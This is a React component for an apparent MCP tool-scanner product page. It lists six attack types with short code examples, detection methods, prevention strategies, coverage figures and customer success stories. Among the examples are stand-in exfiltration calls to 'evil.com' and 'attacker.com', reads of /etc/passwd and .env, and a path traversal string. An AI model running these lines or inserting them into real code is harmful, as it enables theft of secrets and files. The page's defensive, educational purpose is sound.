import React, { useState } from 'react';
import { 
  AlertTriangle, 
  Shield, 
  Terminal, 
  Database, 
  Key, 
  RefreshCw,
  Globe,
  FolderOpen,
  Eye,
  CheckCircle,
  XCircle,
  Code,
  Network,
  Lock,
  Users
} from 'lucide-react';
import './ThreatsProtection.css';

const ThreatsProtection = () => {
  const [selectedThreat, setSelectedThreat] = useState(null);

  const threatCatalog = [
    {
      id: 'command_injection',
      name: 'Command Injection',
      severity: 'CRITICAL',
      icon: Terminal,
      description: 'Attackers execute arbitrary commands through unsanitized user input',
      examples: [
        'exec(f"ls {user_input}")',
        'subprocess.call(["rm", user_data])',
        'os.system(f"echo {param}")'
      ],
      realWorldCase: {
        title: 'MCP File Manager Exploit',
        description: 'A popular MCP file management tool allowed command injection through filename parameters, enabling attackers to execute arbitrary system commands.',
        impact: 'Full system compromise'
      },
      detection: [
        'AST analysis of dangerous functions',
        'Pattern matching for exec/eval calls',
        'Taint analysis from user inputs',
        'Dynamic execution monitoring'
      ],
      prevention: [
        'Input validation and sanitization',
        'Use of safe APIs instead of shell commands',
        'Sandboxing and privilege restriction',
        'Parameter binding for dynamic commands'
      ]
    },
    {
      id: 'data_exfiltration',
      name: 'Data Exfiltration',
      severity: 'HIGH',
      icon: Database,
      description: 'Sensitive data stolen and transmitted to external servers',
      examples: [
        'requests.post("evil.com", data=secrets)',
        'open("/etc/passwd").read()',
        'subprocess.run(["curl", "-d", data, "attacker.com"])'
      ],
      realWorldCase: {
        title: 'MCP Backup Tool Breach',
        description: 'A backup MCP tool was modified to exfiltrate sensitive files to a remote server while appearing to function normally.',
        impact: 'Massive data breach affecting 10,000+ users'
      },
      detection: [
        'Network flow analysis',
        'File access monitoring',
        'Outbound connection detection',
        'Entropy analysis of transmitted data'
      ],
      prevention: [
        'Network egress controls',
        'File access restrictions',
        'Data classification and DLP',
        'Encrypted secure channels only'
      ]
    },
    {
      id: 'credential_theft',
      name: 'Credential Theft',
      severity: 'CRITICAL',
      icon: Key,
      description: 'API keys, passwords, and tokens stolen from environment or files',
      examples: [
        'os.environ["AWS_SECRET_KEY"]',
        'open(".env").read()',
        'subprocess.check_output(["env"])'
      ],
      realWorldCase: {
        title: 'MCP Development Tool Compromise',
        description: 'A malicious MCP development helper harvested API keys and SSH keys from developer environments, leading to supply chain attacks.',
        impact: 'Compromise of multiple downstream projects'
      },
      detection: [
        'Environment variable access tracking',
        'Secret pattern detection',
        'File system monitoring',
        'Credential entropy analysis'
      ],
      prevention: [
        'Secure credential management',
        'Environment isolation',
        'Principle of least privilege',
        'Regular credential rotation'
      ]
    },
    {
      id: 'rug_pull',
      name: 'Rug Pull Attack',
      severity: 'HIGH',
      icon: RefreshCw,
      description: 'Trusted tools maliciously updated to include harmful functionality',
      examples: [
        'Tool update changes behavior silently',
        'New version includes backdoor',
        'Dependencies swapped with malicious ones'
      ],
      realWorldCase: {
        title: 'Popular MCP Weather Tool Hijack',
        description: 'A widely-used weather MCP tool was updated to include cryptocurrency mining and data harvesting code.',
        impact: 'Affected 50,000+ installations'
      },
      detection: [
        'Code signature verification',
        'Behavioral change detection',
        'Dependency mutation tracking',
        'Update authenticity validation'
      ],
      prevention: [
        'Digital signature requirements',
        'Immutable tool versioning',
        'Behavioral monitoring',
        'Update approval workflows'
      ]
    },
    {
      id: 'ssrf',
      name: 'Server-Side Request Forgery',
      severity: 'HIGH',
      icon: Globe,
      description: 'Forced server-side requests to internal/external resources',
      examples: [
        'requests.get(user_url)',
        'urllib.request.urlopen(f"http://{host}")',
        'fetch(untrusted_endpoint)'
      ],
      realWorldCase: {
        title: 'MCP Web Scraper Internal Access',
        description: 'A web scraping MCP tool was exploited to access internal corporate services through SSRF vulnerabilities.',
        impact: 'Internal network reconnaissance and data access'
      },
      detection: [
        'URL validation checking',
        'Internal IP detection',
        'Request pattern analysis',
        'Network boundary monitoring'
      ],
      prevention: [
        'URL allowlisting',
        'Network segmentation',
        'Request validation',
        'Proxy restrictions'
      ]
    },
    {
      id: 'path_traversal',
      name: 'Path Traversal',
      severity: 'MEDIUM',
      icon: FolderOpen,
      description: 'Unauthorized file system access through directory traversal',
      examples: [
        'open(f"files/{user_path}")',
        'Path(user_input).read_text()',
        'os.path.join(base, "../../../etc/passwd")'
      ],
      realWorldCase: {
        title: 'MCP Document Reader Exploit',
        description: 'A document processing MCP tool allowed reading arbitrary files through path traversal in filename parameters.',
        impact: 'Unauthorized access to sensitive system files'
      },
      detection: [
        'Path validation checking',
        'Directory traversal pattern detection',
        'File access boundary monitoring',
        'Symbolic link detection'
      ],
      prevention: [
        'Path canonicalization',
        'Sandboxed file access',
        'Input validation',
        'Chroot jailing'
      ]
    }
  ];

  const protectionFeatures = [
    {
      category: 'Static Analysis',
      icon: Code,
      features: [
        {
          name: 'AST-Based Detection',
          description: 'Deep code structure analysis using Abstract Syntax Trees',
          coverage: '95%'
        },
        {
          name: 'Pattern Matching',
          description: '50+ threat patterns for known attack vectors',
          coverage: '92%'
        },
        {
          name: 'Dependency Analysis',
          description: 'Scan external libraries and imports for threats',
          coverage: '88%'
        }
      ]
    },
    {
      category: 'Dynamic Analysis',
      icon: Network,
      features: [
        {
          name: 'Taint Analysis',
          description: 'Track untrusted data flow through application',
          coverage: '87%'
        },
        {
          name: 'Behavioral Monitoring',
          description: 'Runtime behavior analysis for anomalies',
          coverage: '83%'
        },
        {
          name: 'Network Monitoring',
          description: 'Track outbound connections and data transfers',
          coverage: '90%'
        }
      ]
    },
    {
      category: 'AI-Enhanced',
      icon: Eye,
      features: [
        {
          name: 'ML Threat Detection',
          description: 'Machine learning models for sophisticated attacks',
          coverage: '78%'
        },
        {
          name: 'LLM Analysis',
          description: 'Large language model for context-aware detection',
          coverage: '75%'
        },
        {
          name: 'Semantic Analysis',
          description: 'Understand code intent beyond syntax',
          coverage: '82%'
        }
      ]
    },
    {
      category: 'Policy & Compliance',
      icon: Lock,
      features: [
        {
          name: 'Custom Policies',
          description: 'Define organization-specific security rules',
          coverage: '100%'
        },
        {
          name: 'Compliance Checks',
          description: 'Built-in compliance frameworks (SOC2, ISO27001)',
          coverage: '95%'
        },
        {
          name: 'Risk Scoring',
          description: 'Quantitative risk assessment (0-100 scale)',
          coverage: '100%'
        }
      ]
    }
  ];

  const caseStudies = [
    {
      title: 'Enterprise Deployment Success',
      organization: 'Fortune 500 Financial Services',
      challenge: 'Needed to scan 200+ MCP tools across development teams',
      solution: 'Deployed comprehensive scanner with custom policies',
      results: [
        'Detected 23 critical vulnerabilities in production tools',
        'Prevented potential $2M+ security incident',
        'Achieved 100% tool scanning coverage',
        'Reduced security review time by 75%'
      ]
    },
    {
      title: 'Open Source Project Protection',
      organization: 'Popular MCP Framework',
      challenge: 'Community-contributed tools needed security validation',
      solution: 'Integrated scanner into CI/CD pipeline',
      results: [
        'Automated security checks for all contributions',
        'Blocked 12 malicious tool submissions',
        'Improved community trust and adoption',
        'Zero security incidents post-deployment'
      ]
    }
  ];

  return (
    <div className="threats-protection">
      <div className="section">
        <h2 className="section-title">
          <AlertTriangle className="section-icon" />
          MCP Threat Catalog
        </h2>
        <p className="section-description">
          Common attack vectors targeting Model Context Protocol tools and how we detect them.
        </p>

        <div className="threat-grid">
          {threatCatalog.map((threat) => {
            const Icon = threat.icon;
            return (
              <div
                key={threat.id}
                className={`threat-card ${selectedThreat?.id === threat.id ? 'threat-card-selected' : ''}`}
                onClick={() => setSelectedThreat(threat)}
              >
                <div className="threat-header">
                  <Icon className="threat-icon" size={24} />
                  <div className="threat-info">
                    <h3 className="threat-name">{threat.name}</h3>
                    <span className={`severity-badge severity-${threat.severity.toLowerCase()}`}>
                      {threat.severity}
                    </span>
                  </div>
                </div>
                <p className="threat-description">{threat.description}</p>
              </div>
            );
          })}
        </div>

        {selectedThreat && (
          <div className="threat-detail">
            <div className="detail-header">
              <h3 className="detail-title">{selectedThreat.name} - Detailed Analysis</h3>
              <button 
                className="close-detail"
                onClick={() => setSelectedThreat(null)}
              >
                <XCircle size={20} />
              </button>
            </div>

            <div className="detail-content">
              <div className="detail-section">
                <h4 className="detail-section-title">Code Examples</h4>
                <div className="code-examples">
                  {selectedThreat.examples.map((example, idx) => (
                    <code key={idx} className="code-example">
                      {example}
                    </code>
                  ))}
                </div>
              </div>

              <div className="detail-section">
                <h4 className="detail-section-title">Real-World Case</h4>
                <div className="case-study">
                  <h5 className="case-title">{selectedThreat.realWorldCase.title}</h5>
                  <p className="case-description">{selectedThreat.realWorldCase.description}</p>
                  <div className="case-impact">
                    <strong>Impact:</strong> {selectedThreat.realWorldCase.impact}
                  </div>
                </div>
              </div>

              <div className="detail-grid">
                <div className="detail-section">
                  <h4 className="detail-section-title">How We Detect It</h4>
                  <ul className="detail-list">
                    {selectedThreat.detection.map((method, idx) => (
                      <li key={idx} className="detail-item">
                        <CheckCircle size={16} className="detail-check" />
                        {method}
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="detail-section">
                  <h4 className="detail-section-title">Prevention Strategies</h4>
                  <ul className="detail-list">
                    {selectedThreat.prevention.map((strategy, idx) => (
                      <li key={idx} className="detail-item">
                        <Shield size={16} className="detail-shield" />
                        {strategy}
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="section">
        <h2 className="section-title">
          <Shield className="section-icon" />
          Our Protection Features
        </h2>
        <p className="section-description">
          Multi-layered security analysis combining traditional and AI-enhanced techniques.
        </p>

        <div className="protection-grid">
          {protectionFeatures.map((category, index) => {
            const Icon = category.icon;
            return (
              <div key={index} className="protection-category">
                <div className="category-header">
                  <Icon className="category-icon" size={24} />
                  <h3 className="category-title">{category.category}</h3>
                </div>

                <div className="features-list">
                  {category.features.map((feature, idx) => (
                    <div key={idx} className="feature-item">
                      <div className="feature-info">
                        <h4 className="feature-name">{feature.name}</h4>
                        <p className="feature-description">{feature.description}</p>
                      </div>
                      <div className="feature-coverage">
                        {feature.coverage}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      </div>

      <div className="section">
        <h2 className="section-title">
          <Users className="section-icon" />
          Success Stories
        </h2>
        <p className="section-description">
          Real-world deployments and their security outcomes.
        </p>

        <div className="case-studies-grid">
          {caseStudies.map((study, index) => (
            <div key={index} className="case-study-card">
              <div className="case-study-header">
                <h3 className="case-study-title">{study.title}</h3>
                <div className="case-study-org">{study.organization}</div>
              </div>

              <div className="case-study-content">
                <div className="case-study-section">
                  <h4 className="case-study-section-title">Challenge</h4>
                  <p>{study.challenge}</p>
                </div>

                <div className="case-study-section">
                  <h4 className="case-study-section-title">Solution</h4>
                  <p>{study.solution}</p>
                </div>

                <div className="case-study-section">
                  <h4 className="case-study-section-title">Results</h4>
                  <ul className="case-study-results">
                    {study.results.map((result, idx) => (
                      <li key={idx} className="case-study-result">
                        <CheckCircle size={16} className="result-check" />
                        {result}
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default ThreatsProtection;